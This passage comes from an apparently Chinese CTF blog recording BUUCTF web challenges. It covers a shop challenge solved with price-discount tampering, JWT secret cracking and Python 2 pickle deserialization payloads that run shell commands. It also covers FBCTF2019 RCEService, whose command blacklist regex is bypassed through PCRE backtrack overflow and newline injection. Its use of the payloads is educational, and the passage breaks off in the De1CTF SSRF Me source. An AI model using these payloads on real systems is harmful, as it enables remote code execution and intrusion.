class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>最开始这个脚本跑的时候直接回显了<code>1</code>，但第一页并没有<code>lv6</code>这个东西，我加了个<code>print(r.text)</code>看看怎么个事：</p><p><img src="/img/kun5.png" alt="kun5"></p><p>可以看到这里的字符实在太多，可能有其它东西触发了<code>lv6</code>这个关键字，看了源码发现它的<code>lv</code>是有一定格式的，比如：</p><p><img src="/img/kun6.png" alt="kun6"></p><p>所以把<code>lv6</code>改成<code>lv6.png</code>就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment"># 181</span><br></code></pre></td></tr></table></figure><p>果然在<code>181</code>页发现了我们需要的：</p><p><img src="/img/kun7.png" alt="kun7"></p><p><img src="/img/kun8.png" alt="kun8"></p><p>很明显我们钱不够，抓包看看能不能修改啥的：</p><p><img src="/img/kun9.png" alt="kun9"></p><p>注意这里的<code>price</code>和<code>discount</code>，我们只有一千块，我一开始把价格改成<code>1</code>了但发现不行。。只能通过修改折扣购买(0.0000000001)：</p><p><img src="/img/kun10.png" alt="kun10"></p><p>其实是个302重定向，定向到了<code>b1g_m4mber</code>页面，但提示我们只有<code>admin</code>可以访问：</p><p><img src="/img/kun11.png" alt="kun11"></p><p>其实这里就有点思路了，根据题目提示<code>python,pickle</code>现在只允许管理员访问，那大概率是在<code>cookie</code>中找线索了(注意这里的<code>JWT</code>字段)：</p><p><img src="/img/kun12.png" alt="kun12"></p><p>先把<code>JWT</code>解码：<code>(https://www.bejson.com/jwt/)</code></p><p><img src="/img/kun13.png" alt="kun13"></p><p>可以看到这段<code>JWT</code>是包含着我们用户名的数据，我一开始想的是肯定有什么字段包含着<code>guest</code>之类的东西，然后把它改成<code>admin</code>加密传过去。。但捣鼓了半天不知道这个字段藏在哪了，后面参考了其它师傅的wp发现原来改个<code>username</code>就行。。。先利用<code>jwtcrack</code>爆破这个<code>JWT</code>:</p><p><img src="/img/kun14.png" alt="kun14"></p><p><code>1Kun</code></p><p><img src="/img/kun15.png"></p><p><img src="/img/kun16.png" alt="kun16"></p><p>点这个成为大会员的按钮没啥反应。。看源码有这么个东西：</p><p><img src="/img/kun17.png" alt="kun17"></p><p>访问<code>ef235c7d-6775-4801-a866-8532c547a07c.node4.buuoj.cn:81/static/asd1f654e683wq/www.zip</code>，下载源码：</p><p>根据提示我们找和<code>pickle</code>有关的序列化反序列化操作就行：</p><p><code>pickle.loads</code>存在于<code>Admin.py</code>中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>注意这部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br><span class="hljs-comment">#解码URL编码的数据，然后将结果传递给pickle.loads进行反序列化操作。</span><br><span class="hljs-comment">#我们的payload可以写成：</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urlib.parse<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br><br>a = pickle.dumps(Note())<br>a = urllib.parse.quote(a)<br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment">#%80%04%95%3F%00%00%00%00%00%00%00%8C%08builtins%94%8C%04eval%94%93%94%8C%23__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%94%85%94R%94.</span><br></code></pre></td></tr></table></figure><p>这段代码在我的<code>Kali</code>下可以运行，但放到题目中没用，不知道啥原因去看了<code>wp</code>：</p><p>题目的源码是用python2写的，而且pickle这东西不支持跨版本操作，至于为什么是python2可以从下面这几个例子看出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)  <span class="hljs-comment">#python2中print是一个关键字，而不是一个函数，因此在使用print语句时不需要使用括号，但在python3中这东西是一个函数，要加括号。</span><br>p = pickle.loads(urllib.unquote(become))<br>    <span class="hljs-comment">#其实这段代码就是把become经过URL解码绕后进行一系列操作，如果在python3中运行这个会提示没有unquote这个方法，这东西被移动到urllib.parse模块中，需要from urllib.parse import unquote然后直接a=quote(a)就行。</span><br><span class="hljs-comment">#所以我们要用python2写：</span><br><span class="hljs-comment">#`python2`在线工具：`https://c.runoob.com/compile/6/`</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(Note())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br><span class="hljs-comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/kun18.png" alt="kun18"></p><p>后面就不详细写了，改成<code>ls / </code>然后<code>cat /flag.txt</code>读就行</p><p>其实这道题<code>payload</code>的写法很多，我觉得我这个并不好(因为直接利用了<code>import</code>和<code>os</code>，感觉在有些题中会被过滤掉。。这里补充一些其他师傅的<code>payload</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>a = payload()<br><span class="hljs-built_in">print</span> (urllib.quote(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span> ,))<br><br>a = Test()<br>s = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(urllib.quote(s))<br></code></pre></td></tr></table></figure><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="/img/rceservice.png" alt="rceservice"></p><p>要求输入必须是<code>JSON</code>格式，类似{“xxx”:”xxx”}这样，如果后面那个是要执行的命令那前面的键该是多少？题目也没啥提示。。找了<code>wp</code>发现这题其实是给了源码的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<span class="hljs-comment">//注意这个环境变量的配置，最开始没注意这个东西导致有些命令执行不了</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123; <span class="hljs-comment">//限制必须是字符串格式</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<span class="hljs-comment">//^开头$结尾,.*表示匹配任意数量的任意字符(除换行外)</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>Enter command as JSON</code>：<code>&#123;&quot;cmd&quot;%3A&quot;ls&quot;&#125;</code>:</p><p><img src="/img/rceservice2.png" alt="rceservice2"></p><p>首先是<code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>这东西，将环境变量 <code>PATH</code> 的值设置为 <code>/home/rceservice/jail</code>。在操作系统中，<code>PATH</code> 环境变量通常用于指定可执行程序的搜索路径。通过将 <code>PATH</code> 设置为 <code>/home/rceservice/jail</code>，可以指定系统在执行命令时只在该目录中查找可执行文件。</p><p><code>putenv 相当于一个简陋的沙盒, 让 shell 默认从 /home/rceservice/jail下寻找命令, 后面看的时候发现这个目录下只有一个 ls, 但其实使用绝对路径执行命令 (/bin/cat) 就能够绕过限制了  //参考：https://exp10it.cn/2022/09/buuctf-web-writeup-5/#fbctf2019rceservice</code></p><p>绕过的话有两种方法，一种是是回溯绕过，第二种就是<code>%0A</code>换行绕过。</p><p>参考文章：<code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=1#reply-list</code></p><p><code>https://www.cnblogs.com/yjken/articles/3922339.html</code></p><p>大致意思就是我们可以通过构造超级长的字符串让<code>preg_match</code>执行失败返回<code>False</code>。这样如果未对结果进行强等于判断<code>===</code>就可以实现绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://d74b595f-f641-43c5-87fb-36ddfabc88f0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;ls /home/&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#ls是可以直接用的</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br><span class="hljs-comment">#注意这里要用POST，因为GET头不能太大否则会返回TooLargeRequest</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice3.png" alt="rceservice3"></p><p>并没有<code>flag</code>，不过我们可以调用<code>find</code>命令查找<code>flag</code>所在位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag*&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#注意这里的find</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice4.png" alt="rceservice4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#ls是可以直接用的</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice5.png" alt="rceservice5"></p><p><code>flag&#123;81327f89-050f-46f1-ae16-177e1da4ac08&#125;</code></p><p>换行绕过主要就是<code>.</code>这个东西不会去匹配换行符，一开始想的是构造的<code>payload</code>必须符合<code>JSON</code>这东西的格式，想了挺久不知道该把换行符放哪。</p><p>最开始没看懂师傅们的<code>wp</code>怎么写的，想了一下这东西其实就可以看成：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>%<span class="hljs-number">0</span>A<span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%<span class="hljs-number">0</span>A<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice6.png" alt="rceservice6"></p><p>还有其它两种：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%0A%0A&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;%0A%0A<span class="hljs-string">`</span><br><span class="hljs-string"></span><br><span class="hljs-string">`</span>&#123;%0A<span class="hljs-string">&quot;cmd&quot;</span>:%0A<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>参考文章：<code>https://www.cnblogs.com/20175211lyz/p/12198258.html</code></p><p><code>https://www.cnblogs.com/Article-kelp/p/16046129.html</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuctf做题记录_3</title>
    <link href="/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/"/>
    <url>/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录。</p><span id="more"></span><hr><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><code>Hint:flag is in ./flag.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># Set default encoding to latin1</span><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>) <span class="hljs-comment">#生成一个16字节的随机密钥</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<span class="hljs-comment">#接受四个参数</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip) <span class="hljs-comment">#利用md5为ip加密然后赋值给sandbox属性</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(self.sandbox):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<span class="hljs-comment"># 创建空字典</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>        <span class="hljs-keyword">if</span> self.checkSign(): <span class="hljs-comment">#scan 和 read</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%s是一个占位符，将被self.sandbox的值替换</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span 